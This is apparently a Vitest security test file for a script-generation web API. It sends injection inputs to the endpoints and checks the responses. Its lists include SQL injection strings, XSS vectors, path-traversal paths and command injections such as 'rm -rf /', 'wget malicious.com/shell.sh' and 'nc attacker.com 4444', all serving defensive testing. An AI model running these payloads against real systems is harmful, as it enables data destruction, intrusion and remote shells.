import { describe, it, expect, beforeEach, vi } from "vitest";
import { POST } from "@/app/api/generate/route";
import { POST as POSTAnalyze } from "@/app/api/analyze/route";
import { auth } from "@/lib/auth";
import { getBindings } from "@/lib/cloudflare";
import { createDb } from "@/lib/db";
import { checkRateLimit, getRateLimitContext } from "@/lib/rate-limit";
import {
  generateScripts,
  generateGuestScripts,
} from "@/lib/services/generation";
import { analyzeTikTokUrl } from "@/lib/services/competitor-analysis";

vi.mock("@/lib/auth", () => ({
  auth: vi.fn(),
}));

vi.mock("@/lib/cloudflare", () => ({
  getBindings: vi.fn(),
}));

vi.mock("@/lib/db", () => ({
  createDb: vi.fn(),
}));

vi.mock("@/lib/rate-limit", () => ({
  checkRateLimit: vi.fn(),
  getRateLimitContext: vi.fn(),
}));

vi.mock("@/lib/services/generation", () => ({
  generateScripts: vi.fn(),
  generateGuestScripts: vi.fn(),
}));

vi.mock("@/lib/services/competitor-analysis", () => ({
  analyzeTikTokUrl: vi.fn(),
}));

vi.mock("@/lib/api-utils", async () => {
  const actual = await vi.importActual("@/lib/api-utils");
  return {
    ...actual,
    validateCSRF: vi.fn(() => true),
  };
});

describe("Integration: Input Sanitization and Security", () => {
  const mockSession = {
    user: {
      id: "user-1",
      email: "test@example.com",
      credits: 100,
    },
    expires: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
  };

  const mockEnv = {
    DB: {} as D1Database,
    AI: {} as Ai,
    NEXTAUTH_SECRET: "test-secret",
    GOOGLE_CLIENT_ID: "test-google-client-id",
    GOOGLE_CLIENT_SECRET: "test-google-secret",
    GITHUB_CLIENT_ID: "test-github-client-id",
    GITHUB_CLIENT_SECRET: "test-github-secret",
    NEXTAUTH_URL: "http://localhost:3000",
  };

  const mockDb = {};

  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(getBindings).mockReturnValue(mockEnv as any);
    vi.mocked(createDb).mockReturnValue(mockDb as any);
    vi.mocked(checkRateLimit).mockResolvedValue({ allowed: true });
    vi.mocked(getRateLimitContext).mockResolvedValue({
      identifier: { type: "user", value: "user-1" },
      tier: "free",
    });
    vi.mocked(generateScripts).mockResolvedValue({
      success: true,
      scripts: [
        { angle: "Pain Point", script: "Script 1" },
        { angle: "Benefit", script: "Script 2" },
        { angle: "Social Proof", script: "Script 3" },
      ],
      creditsRemaining: 95,
      generationId: "gen-1",
    });
    vi.mocked(analyzeTikTokUrl).mockResolvedValue({
      success: true,
      result: {
        hook: "Test hook",
        structure: [{ label: "Intro", summary: "Test summary" }],
        template: [{ label: "Hook", script: "Test script" }],
      },
    });
  });

  describe("Unicode and Special Characters", () => {
    it("should handle Unicode characters in product description", async () => {
      const unicodeInputs = [
        "Café résumé naïve - this is a longer description",
        "日本語のテスト - this is a product description in Japanese",
        "Текст на кириллице with more characters for validation",
        "النص العربي - هذا وصف أطول للمنتج باللغة العربية",
        "עברית זהו תיאור מוצר ארוך יותר בעברית",
        "Emoji test 🎉🚀💯 with many more characters to pass validation",
        "Mixed ASCII and 你好 this is a longer description text",
        "Special chars: © ® ™ € £ ¥ and more text to meet minimum length",
      ];

      for (const input of unicodeInputs) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: input,
          }),
        });

        const response = await POST(request);
        expect(response.status).toBe(200);

        const body = await response.json();
        expect(body.success).toBe(true);
      }
    });

    it("should normalize Unicode input (NFC/NFD)", async () => {
      const composed = "cafe\u0301";
      const precomposed = "é";

      const request1 = new Request("https://adocavo.net/api/generate", {
        method: "POST",
        body: JSON.stringify({
          hookId: "hook-1",
          productDescription: `Test ${composed} product description that is long enough`,
        }),
      });

      const request2 = new Request("https://adocavo.net/api/generate", {
        method: "POST",
        body: JSON.stringify({
          hookId: "hook-1",
          productDescription: `Test ${precomposed} product description that is long enough`,
        }),
      });

      const response1 = await POST(request1);
      const response2 = await POST(request2);

      expect(response1.status).toBe(200);
      expect(response2.status).toBe(200);
    });

    it("should handle zero-width characters", async () => {
      const inputsWithZwc = [
        "Test\u200Bproduct with a longer description for validation", // Zero-width space
        "Test\u200Cproduct with additional text to meet requirements", // Zero-width non-joiner
        "Test\u200Dproduct and more characters to pass the length check", // Zero-width joiner
        "Test\uFEFFproduct with enough text to validate minimum length", // Zero-width no-break space (BOM)
      ];

      for (const input of inputsWithZwc) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: input,
          }),
        });

        const response = await POST(request);
        expect(response.status).toBe(200);
      }
    });

    it("should handle right-to-left text", async () => {
      const rtlInputs = [
        "שלום עולם זהו מוצר טוב מאוד",
        "مرحبا بالعالم هذا منتج جيد جدا",
        "הכנסת טקסט מימין לשמאל",
      ];

      for (const input of rtlInputs) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: input,
          }),
        });

        const response = await POST(request);
        expect(response.status).toBe(200);
      }
    });

    it("should handle very long Unicode strings", async () => {
      const longEmojiString = "🎉".repeat(50);
      const request = new Request("https://adocavo.net/api/generate", {
        method: "POST",
        body: JSON.stringify({
          hookId: "hook-1",
          productDescription: `Product with many emojis: ${longEmojiString}`,
        }),
      });

      const response = await POST(request);
      expect(response.status).toBe(200);
    });
  });

  describe("SQL Injection Prevention", () => {
    it("should sanitize SQL injection attempts in product description", async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "1' UNION SELECT * FROM users--",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' AND 1=1--",
        "admin' /*",
        "'; SHUTDOWN; --",
        "1'; DELETE FROM generated_scripts WHERE 1=1--",
      ];

      for (const injection of sqlInjectionAttempts) {
        vi.mocked(generateScripts).mockClear();

        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: injection,
          }),
        });

        const response = await POST(request);

        if (injection.length >= 20 && injection.length <= 1000) {
          expect(response.status).toBe(200);

          if (response.status === 200) {
            const calls = vi.mocked(generateScripts).mock.calls;
            if (calls.length > 0) {
              const sanitizedInput = calls[0][2].productDescription;
              expect(sanitizedInput).toBe(injection.trim());
            }
          }
        }
      }
    });

    it("should handle SQL injection in hookId", async () => {
      const sqlInjectionIds = [
        "1'; DROP TABLE hooks--",
        "hook-1' OR '1'='1",
        "../../../etc/passwd",
        "hook-1\x00admin",
        "hook-1'; EXEC--",
      ];

      for (const maliciousId of sqlInjectionIds) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: maliciousId,
            productDescription:
              "A valid product description that is long enough",
          }),
        });

        const response = await POST(request);

        // API accepts hookId values but returns 404 if hook doesn't exist
        // The important thing is that the input doesn't cause SQL injection
        expect([200, 400, 404, 500]).toContain(response.status);
      }
    });

    it("should escape quotes and special characters", async () => {
      const specialChars = [
        'Product with "quotes"',
        "Product with 'apostrophes'",
        "Product with \\backslashes\\",
        "Product with ; semicolons ;",
        "Product with -- comments",
        "Product with /* inline */ comments",
      ];

      for (const input of specialChars) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: input,
          }),
        });

        const response = await POST(request);
        expect(response.status).toBe(200);
      }
    });
  });

  describe("XSS Prevention", () => {
    it("should sanitize XSS attempts in product description", async () => {
      const xssAttempts = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<select onfocus=alert('xss') autofocus>",
        "<textarea onfocus=alert('xss') autofocus>",
        "&lt;script&gt;alert('xss')&lt;/script&gt;",
      ];

      for (const xss of xssAttempts) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: xss,
          }),
        });

        const response = await POST(request);
        expect(response.status).toBe(200);

        const body = await response.json();
        expect(body.success).toBe(true);
      }
    });

    it("should handle HTML entity encoding", async () => {
      const htmlEntities = [
        "&lt;script&gt;",
        "&amp;&amp;",
        "&quot;quotes&quot;",
        "&#39;apostrophe&#39;",
        "&#x3C;script&#x3E;",
      ];

      for (const entity of htmlEntities) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: `Product with ${entity}`,
          }),
        });

        const response = await POST(request);
        expect(response.status).toBe(200);
      }
    });
  });

  describe("Path Traversal Prevention", () => {
    it("should sanitize path traversal attempts", async () => {
      const pathTraversalAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%2fpasswd",
        "........//....//etc/passwd",
      ];

      for (const path of pathTraversalAttempts) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: path,
            productDescription:
              "A valid product description that is long enough",
          }),
        });

        const response = await POST(request);
        // Path traversal attempts in hookId should return 404 (hook not found)
        // or 200 if the hook ID format is accepted (hook doesn't exist)
        // The important thing is that the path doesn't cause file system access
        expect([200, 400, 404]).toContain(response.status);
      }
    });
  });

  describe("Command Injection Prevention", () => {
    it("should sanitize command injection attempts", async () => {
      const commandInjections = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "; wget malicious.com/shell.sh",
        "`whoami`",
        "$(id)",
        "; curl http://evil.com",
        "| nc attacker.com 4444",
        "; ping -c 1 attacker.com",
      ];

      for (const injection of commandInjections) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: `Product ${injection}`,
          }),
        });

        const response = await POST(request);
        const body = await response.json();

        if (response.status === 200) {
          expect(body.success).toBe(true);
        }
      }
    });
  });

  describe("URL Validation in Analyze Endpoint", () => {
    it("should validate TikTok URL format", async () => {
      const validUrls = [
        "https://www.tiktok.com/@user/video/123456789",
        "https://tiktok.com/@user/video/123456789",
        "https://vm.tiktok.com/ZMJabcd/",
        "https://www.tiktok.com/t/abcd1234",
      ];

      for (const url of validUrls) {
        const request = new Request("https://adocavo.net/api/analyze", {
          method: "POST",
          body: JSON.stringify({ url }),
        });

        const response = await POSTAnalyze(request);
        expect(response.status).not.toBe(400);
      }
    });

    it("should reject non-TikTok URLs", async () => {
      const invalidUrls = [
        "https://www.youtube.com/watch?v=123",
        "https://instagram.com/p/abcd1234",
        "https://example.com",
        "ftp://malicious.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
      ];

      for (const url of invalidUrls) {
        const request = new Request("https://adocavo.net/api/analyze", {
          method: "POST",
          body: JSON.stringify({ url }),
        });

        const response = await POSTAnalyze(request);
        expect([400, 422]).toContain(response.status);
      }
    });

    it("should handle URL-encoded malicious input", async () => {
      const encodedUrls = [
        "https://tiktok.com/@user/video/%3Cscript%3Ealert%281%29%3C/script%3E",
        "https://tiktok.com/@user/video/%22%3E%3Cscript%3Ealert%281%29%3C/script%3E",
      ];

      for (const url of encodedUrls) {
        const request = new Request("https://adocavo.net/api/analyze", {
          method: "POST",
          body: JSON.stringify({ url }),
        });

        const response = await POSTAnalyze(request);
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe("Input Length Validation", () => {
    it("should enforce minimum length on product description", async () => {
      const shortInputs = [
        "",
        "a",
        "ab",
        "1234567890123456789",
        "   ", // Whitespace only
        "\n\n\n",
        "\t\t\t",
      ];

      for (const input of shortInputs) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: input,
          }),
        });

        const response = await POST(request);
        expect(response.status).toBe(400);
      }
    });

    it("should enforce maximum length on product description", async () => {
      const longInput = "a".repeat(1001);

      const request = new Request("https://adocavo.net/api/generate", {
        method: "POST",
        body: JSON.stringify({
          hookId: "hook-1",
          productDescription: longInput,
        }),
      });

      const response = await POST(request);
      expect(response.status).toBe(400);
    });

    it("should trim whitespace from input", async () => {
      const request = new Request("https://adocavo.net/api/generate", {
        method: "POST",
        body: JSON.stringify({
          hookId: "hook-1",
          productDescription:
            "   \n\t  A valid product description that is long enough   \n\t  ",
        }),
      });

      const response = await POST(request);
      expect(response.status).toBe(200);

      const calls = vi.mocked(generateScripts).mock.calls;
      if (calls.length > 0) {
        const sanitizedInput = calls[0][2].productDescription;
        expect(sanitizedInput).not.toMatch(/^\s/);
        expect(sanitizedInput).not.toMatch(/\s$/);
      }
    });
  });

  describe("Null Byte Injection", () => {
    it("should sanitize null bytes from input", async () => {
      const nullByteInputs = [
        "Product\x00description",
        "hook-\x00id",
        "test\x00\x00\x00value",
      ];

      for (const input of nullByteInputs) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: input,
            productDescription:
              "A valid product description that is long enough",
          }),
        });

        const response = await POST(request);
        expect([400, 200, 404]).toContain(response.status);
      }
    });
  });

  describe("Header Injection Prevention", () => {
    it("should prevent CRLF injection in input", async () => {
      const crlfAttempts = [
        "Product\r\nX-Injected-Header: malicious",
        "Product%0D%0AX-Injected-Header: malicious",
        "Product\rX-Injected: value",
        "Product\nX-Injected: value",
      ];

      for (const input of crlfAttempts) {
        const request = new Request("https://adocavo.net/api/generate", {
          method: "POST",
          body: JSON.stringify({
            hookId: "hook-1",
            productDescription: input,
          }),
        });

        const response = await POST(request);

        const headers = response.headers;
        expect(headers.get("X-Injected-Header")).toBeNull();
        expect(headers.get("X-Injected")).toBeNull();
      }
    });
  });
});
